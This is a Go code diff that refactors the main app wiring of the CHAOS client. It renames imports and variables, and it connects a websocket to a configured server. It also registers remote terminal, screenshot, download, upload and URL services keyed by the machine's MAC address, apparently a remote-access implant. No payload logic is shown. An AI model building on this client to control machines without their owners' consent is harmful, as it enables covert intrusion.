@@ -1,7 +1,8 @@
 package app
 
 import (
-	"github.com/tiagorlampert/CHAOS/client/app/gateway/client"
+	"github.com/tiagorlampert/CHAOS/client/app/environment"
+	"github.com/tiagorlampert/CHAOS/client/app/gateways/client"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
 	"github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
@@ -14,8 +15,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/services/terminal"
 	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
 	"github.com/tiagorlampert/CHAOS/client/app/services/url"
-	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
-	"github.com/tiagorlampert/CHAOS/client/app/utilities/network"
+	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
 	"log"
 )
 
@@ -24,24 +24,24 @@ type App struct {
 }
 
 func New(configuration *environment.Configuration) *App {
-	informationService := information.NewService(configuration.Server.HttpPort)
+	infoService := information.NewService(configuration.Server.HttpPort)
 
-	device, err := informationService.LoadDeviceSpecs()
+	deviceSpecs, err := infoService.LoadDeviceSpecs()
 	if err != nil {
 		log.Fatal("error loading device specs: ", err)
 	}
 
-	connection, _ := websocket.NewConnection(configuration, device.MacAddress)
+	connection, _ := websocket.NewConnection(configuration, deviceSpecs.MacAddress)
 
 	httpClient := network.NewHttpClient(10)
 
 	operatingSystem := os.DetectOS()
-	terminalService := terminal.NewTerminalService()
+	terminalService := terminal.NewService()
 
 	clientGateway := client.NewGateway(configuration, httpClient)
 
 	clientServices := &services.Services{
-		Information: informationService,
+		Information: infoService,
 		Terminal:    terminalService,
 		Screenshot:  screenshot.NewService(),
 		Download:    download.NewService(configuration, clientGateway),
@@ -53,7 +53,7 @@ func New(configuration *environment.Configuration) *App {
 	}
 
 	return &App{handler.NewHandler(
-		connection, configuration, clientGateway, clientServices, device.MacAddress)}
+		connection, configuration, clientGateway, clientServices, deviceSpecs.MacAddress)}
 }
 
 func (a *App) Run() {
